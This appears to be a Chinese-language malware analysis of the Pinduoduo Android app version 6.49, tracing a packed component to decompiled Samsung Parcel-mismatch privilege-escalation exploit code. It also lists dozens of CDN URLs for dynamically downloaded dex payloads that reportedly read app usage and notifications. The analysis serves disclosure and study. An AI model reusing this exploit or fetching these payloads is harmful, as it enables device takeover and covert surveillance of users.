# 拼多多apk内嵌提权代码，及动态下发dex分析

参考「 深蓝洞察 」的文章：https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw
（Bundle 风水 - Android Parcel 序列化与反序列化不匹配系列漏洞，实现 0day/Nday 攻击，从而绕过系统校验，获取系统级 StartAnyWhere 能力）

![image](https://user-images.githubusercontent.com/16593068/223938152-ace2a6a9-19b3-43d4-b409-b98c34cdd185.png)
![image](https://user-images.githubusercontent.com/16593068/223938640-bae98d84-8365-456f-b6df-5dd5b373ea59.png)


复现流程如下：  

下载3月5日前更新的（6.50版本前）的拼多多apk，如6.49版本：  
https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728  





## 拼多多-V6.49.0.apk 

https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728

![](https://pora-images-1251578175.cos.ap-shanghai.myqcloud.com/images/2023/03/09/9c4cc494b9abaf75addb210198f7e704-253ffd80c9.png)

| 标题         | 值                                                           |
| ------------ | ------------------------------------------------------------ |
| Author       | 上海寻梦信息技术有限公司                                     |
| SHA256       | ddaf85e8e86cf08a423629e9cd9ff59b42fd98d7b4dda74d09690544f0bccf35 |
| Package Name | com.xunmeng.pinduoduo                                        |
| Date         | Feb 23th, 2023                                               |
| Size         | 27.28 MB                                                     |
| Downloads    | 173,690                                                      |
| Permissions  | 87                                                           |
| Language     | English                                                      |
| Op. System   | Android                                                      |
| Category     | [Shopping](https://en.uptodown.com/android/shopping)         |
| Requirements | Android 4.0.3, 4.0.4 or higher required                      |
| Architecture | armeabi-v7a                                                  |

## 拼多多-V6.50.0.apk 

https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728

![image](https://user-images.githubusercontent.com/16593068/223938640-bae98d84-8365-456f-b6df-5dd5b373ea59.png)

| 标题         | 值                                                           |
| ------------ | ------------------------------------------------------------ |
| Author       | 上海寻梦信息技术有限公司                                     |
| SHA256       | 93958586e0b49515a4393b768ebafc597c5eb6e253b287032e4304b6f4334f98 |
| Package Name | com.xunmeng.pinduoduo                                        |
| Date         | Mar 5th, 2023                                                |
| Size         | 27.11 MB                                                     |
| Downloads    | 173,690                                                      |
| Permissions  | 87                                                           |
| Language     | English                                                      |
| Op. System   | Android                                                      |
| Category     | [Shopping](https://en.uptodown.com/android/shopping)         |
| Requirements | Android 4.0.3, 4.0.4 or higher required                      |
| Architecture | armeabi-v7a                                                  |



### virustotal download for 拼多多-V6.49.0.apk 

https://www.virustotal.com/gui/file/ddaf85e8e86cf08a423629e9cd9ff59b42fd98d7b4dda74d09690544f0bccf35/details

## apktool

https://ibotpeaches.github.io/Apktool/

```
>java -jar apktool_2.7.0.jar d 拼多多-V6.49.0.apk
I: Using Apktool 2.7.0 on 拼多多-V6.49.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: C:\Users\admin\AppData\Local\apktool\framework\1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes3.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes5.dex...
I: Baksmaling classes6.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

## 拼多多-V6.49.0.apk VS 拼多多-V6.50.0.apk

![image](https://user-images.githubusercontent.com/16593068/223938152-ace2a6a9-19b3-43d4-b409-b98c34cdd185.png)

![](https://pora-images-1251578175.cos.ap-shanghai.myqcloud.com/images/2023/03/09/5a644d55650e8e6f489f6c41f6fa19e5-3c94b26726.png)

解压缩

![](https://pora-images-1251578175.cos.ap-shanghai.myqcloud.com/images/2023/03/09/2379dd74b948b5298040cea2d9c85fc4-1a8366022b.png)

```bash
> root@ubuntu1804# ls /tmp/pdd 
com.xunmeng.pinduoduo.AliveBaseAbility.7z

> root@ubuntu1804# 7z x com.xunmeng.pinduoduo.AliveBaseAbility.7z
Scanning the drive for archives:
1 file, 144086 bytes (141 KiB)
Extracting archive: com.xunmeng.pinduoduo.AliveBaseAbility.7z
WARNING:
com.xunmeng.pinduoduo.AliveBaseAbility.7z
Can not open the file as [7z] archive
The file is open as [lzma] archive
--
Path = com.xunmeng.pinduoduo.AliveBaseAbility.7z
Open WARNING: Can not open the file as [7z] archive
Type = lzma
Everything is Ok                             
Archives with Warnings: 1
Size:       497152
Compressed: 144086

> root@ubuntu1804# ls /tmp/pdd 

com.xunmeng.pinduoduo.AliveBaseAbility  com.xunmeng.pinduoduo.AliveBaseAbility.7z

> root@ubuntu1804# mkdir /tmp/pdd/AliveBaseAbility   

> root@ubuntu1804# tar -xvf com.xunmeng.pinduoduo.AliveBaseAbility -C AliveBaseAbility
com.xunmeng.pinduoduo.AliveBaseAbility.md5checker
assets/json.config
vmp_src/mw1.bin
com.xunmeng.pinduoduo.AliveBaseAbility.manifest

> root@ubuntu1804# ls /tmp/pdd 
AliveBaseAbility  com.xunmeng.pinduoduo.AliveBaseAbility  com.xunmeng.pinduoduo.AliveBaseAbility.7z

> root@ubuntu1804# cd  /tmp/pdd/AliveBaseAbility

> root@ubuntu1804# ls /tmp/pdd/AliveBaseAbility 
assets  com.xunmeng.pinduoduo.AliveBaseAbility.manifest  com.xunmeng.pinduoduo.AliveBaseAbility.md5checker  vmp_src

> root@ubuntu1804# tree /tmp/pdd/AliveBaseAbility
.
├── assets
│   └── json.config
├── com.xunmeng.pinduoduo.AliveBaseAbility.manifest
├── com.xunmeng.pinduoduo.AliveBaseAbility.md5checker
└── vmp_src
    └── mw1.bin
2 directories, 4 files
```

![](https://pora-images-1251578175.cos.ap-shanghai.myqcloud.com/images/2023/03/09/a60a76bacba20de7f983e053a54cdb2c-927cfebafe.png)

### AliveBaseAbility/com.xunmeng.pinduoduo.AliveBaseAbility.manifest

```python
PDD_MANIFEST
VERSION: 1.0.0
KEEP:
assets/
vmp_src/
assets/json.config
vmp_src/mw1.bin
com.xunmeng.pinduoduo.AliveBaseAbility.md5checker
```

### AliveBaseAbility/com.xunmeng.pinduoduo.AliveBaseAbility.md5checker

```json
{
  "component_id": "com.xunmeng.pinduoduo.AliveBaseAbility",
  "version": "1.0.0",
  "md5_list": {
    "vmp_src/mw1.bin": {
      "length": 492328,
      "md5": "569d110753d56aec16b81f8394c5b2d8"
    },
    "assets/json.config": {
      "length": 265,
      "md5": "1939acdf6e35fb9ec4cd0b1192f5993b"
    },
    "com.xunmeng.pinduoduo.AliveBaseAbility.manifest": {
      "length": 136,
      "md5": "44545e6bfaba72bfa7b1cd2a4c3a0e73"
    }
  }
}
```

### AliveBaseAbility/assets/json.config

```json
{
  "file_desc": {
    "vmp_src/mw1.bin": {
      "length": 492328,
      "md5": "569D110753D56AEC16B81F8394C5B2D8"
    }
  },
  "name": "alive_base_ability_plugin",
  "min_sdk_ver": "6.1.0",
  "md5_desc": {
    "vmp_src/mw1.bin": {
      "length": 492328,
      "md5": "569D110753D56AEC16B81F8394C5B2D8"
    }
  },
  "plugin_sdk_ver": "6.49.7"
}
```

`AliveBaseAbility/vmp_src/mw1.bin`

解压apk文件，找到拼多多apk中，提权代码所在的文件位置：  
pinduoduo-6-49-0.zip\assets\component\com.xunmeng.pinduoduo.AliveBaseAbility.7z\com.xunmeng.pinduoduo.AliveBaseAbility\vmp_src\mw1.bin
以上是一个加VMP壳的dex文件，脱壳还原出代码，可以找到针对不同手机厂商系统的多个用于提权的漏洞利用代码，胆子相当的大，比如利用三星手机“com.samsung.android.cepproxyks.CertByte”的提权漏洞，代码如下：


 ```
// assets/component/com.xunmeng.pinduoduo.AliveBaseAbilitiy
// [Manwei]
// com/xunmeng/pinduoduo/android_pull_ablity_comp/pullstartup/SamsungAlivePullStartup 

Public static Bundle makeBundleForSamsungSinceP(Intent intent){
	Bundle bundle = new Bundle();
	Parcel obtain = Parcel.obtain();
	Parcel obtain2 = Parcel.obtain();
	Parcel obtain3 = Parcel.obtain();
	obtain2.writeInt(3);
	obtain2.writeInt(13);
	obtain2.writeInt(72);
	obtain2.writeInt(3);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(4);
	obtain2.writeString("com.samsung.android.cepproxyks.CertByte");
	obtain2.writeInt(0);
	byte b[] = new byte[0];
	obtain2.writeByteArray(b);
	obtain2.writeInt(0);
	obtain2.writeInt(13);
	obtain2.writeInt(72);
	obtain2.writeInt(53);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(1);
	obtain2.writeInt(1);
	obtain2.writeInt(13);
	obtain2.writeInt(72);
	obtain2.writeInt(48);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(0);
	obtain2.writeInt(13);
	obtain2.writeInt(-1);
	int dataPosition = obtain2.dataPosition();
	obtain2.writeString("intent");
	obtain2.writeInt(4);
	obtain2.writeString("android.content.Intent");
	obtain2.writeToParcel(obtain3, 0);
	obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
	int dataPosition2 = obtain2.dataPosition();
	obtain2.setDataPosition(dataPosition2 - 4);
	obtain2.writeInit(dataPosition2 -dataPosition);
	obtain2.setdataPosition(dataPosition2);
	int dataSize = obtain2.dataSize();
	obtain.writeInt(dataSize);
	obtain.writeInt(1279544898);
	obtain.appendFrom(obtain2, 0, dataSize);
	obtain.setDataPosition(0);
	bundle.readFromParcel(obtain);
	return bundle;
}
```


提权后，就开始瞎搞了，动态下发dex，开始给自己保活，防卸载，然后搞数据，这部分代码比较通俗易懂，
比如：  
1a68d982e02fc22b464693a06f528fac.dex    读取用户手机上的app使用记录  
95cd95ab4d694ad8bdf49f07e3599fb3.dex    读取用户手机的应用通知，这一波各大公司app全灭了吧？  

自己去dex目录看吧。  

  
  部分dex文件的下载地址（3月3日已被拼多多从CDN服务器上删除）：  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/4a72c6bb-337c-46c4-8c9c-637efafdd1c6.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/61517b68-7c09-4021-9aaa-cdebeb9549f2.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/78afc1cd-60da-482b-90e7-4d5e72a01266.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/f9b6b139-4516-4ac2-896d-8bc3eb1f2d03.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/6932a923-9f13-4624-bfea-1249ddfd5505.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/7c6e6702-e461-4315-8631-eee246aeba95.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/8c34f5dc-f04c-40ba-98d4-7aa7c364b65c.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a3937709-b9cc-48fd-8918-163c9cb7c2df.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a4d4dccf-1f8c-48e3-acd5-92cdf156e585.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/e9ded9d4-1c94-47d0-8e8b-94aa773af81c.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/4569a29c-b5a8-4dcf-a3a6-0a2f0bfdd493.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/538278f3-9f68-4fce-be10-12635b9640b2.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7ce6d296-a5bd-4718-9f79-543621ba5422.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/e723d560-c2ee-461e-b2a1-96f85b614f2b.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/f0139a82-8bb6-4f3e-a81b-70200fc38eaa.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/sdlog/218a37ea-710d-49cb-b872-2a47a1115c69.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/136d4651-df47-41b4-bb80-2ec0ab1bc775.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/4f260398-e9d1-4390-bbb9-eeb49c07bf3c.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/7dee63bd-ebad-4d74-a06f-90750aa18e18.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/8b56d820-cac2-4ca0-8a3a-1083c5cca7ae.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/cdcbd06b-8a32-4645-b9fe-c186b548c34e.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/5d372522-b6a4-4c1b-a0b4-8114d342e6c0.dex  
  https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/74168acd-14b4-4ff8-842e-f92b794d7abf.dex  
  https://commfile.pddpic.com/sdfile/common/1a68d982e02fc22b464693a06f528fac.dex  
  https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex  
  https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex  
  https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex  
  https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex  
  https://commfile.pddpic.com/sdfile/common/561341f5f7976e13efce7491887f1306.dex  
  https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex  
  https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex  
  https://commfile.pddpic.com/sdfile/common/6f9451e79a0a4b53aff86fe489dffd22.dex  
  https://commfile.pddpic.com/sdfile/common/98f10c20525142f9929b4f267b6ccf4d.dex  
  https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex  
  https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex  
  https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex  
  https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex  
  https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex  
  https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex  
  https://commfile.pddpic.com/sdfile/common/d4b6d58467fb417380d53382b8adcfd6.dex  
  https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex  
  https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex  
  https://commfile.pddpic.com/sdfile/common/f35735a5cbf445c785237797138d246a.dex  
  https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex  
  https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex  
  https://commfile.pddpic.com/sdfile/common/td/8aeb045fad9343acbbd1a26998b6485a.dex  
  https://commfile.pddpic.com/sdfile/hw/da03be2689cc463f901806b5b417c9f5.dex  
  https://commfile.pddpic.com/sdfile/hw/perm/257682c986ab449ab9e7c8ae7682fa61.dex  
  https://commfile.pddpic.com/sdfile/oppo/480ed5841ebf4b9c8900c19e700edbed.dex  
  https://commfile.pddpic.com/sdfile/oppo/50679b0fc43a458dabac39730616fa9b.dex  
  https://commfile.pddpic.com/sdfile/oppo/67c9e686004f45158e94002e8e781192.dex  
  https://commfile.pddpic.com/sdfile/oppo/bbbfcfd4cc67499eac47f6e44a37b8a4.dex  
  https://commfile.pddpic.com/sdfile/oppo/dc638f3e6fa84d56970d9a8ff4fc5295.dex  
  https://commfile.pddpic.com/sdfile/vivo/0bb624afe4b54063bfa3299d3afd9736.dex  
  https://commfile.pddpic.com/sdfile/vivo/183bb87aa7d744a195741ce524577dd0.dex  
  https://commfile.pddpic.com/sdfile/vivo/2eb20dc580aaa5186ee4a4ceb2374669.dex  
  https://commfile.pddpic.com/sdfile/vivo/7877ec6850344e7aad5fdd57f6abf238.dex  
  https://commfile.pddpic.com/sdfile/vivo/a093b2d4f28c47b186e61951cb14c781.dex  
  https://commfile.pddpic.com/sdfile/vivo/a840668f7567459b95869165cfcd13cb.dex  
  https://commfile.pddpic.com/sdfile/vivo/ab8ed4c3482c42a1b8baef558ee79deb.dex  
  https://commfile.pddpic.com/sdfile/vivo/be7a2b643d7e8543f49994ffeb0ee0b6.dex  
  https://commfile.pddpic.com/sdfile/vivo/d643e0f9a68342bc8403a69e7ee877a7.dex  
  https://commfile.pddpic.com/sdfile/xm/0fc0e98ac2e54bc29401efaddfc8ad7f.dex  
  https://commfile.pddpic.com/sdfile/xm/95cd95ab4d694ad8bdf49f07e3599fb3.dex
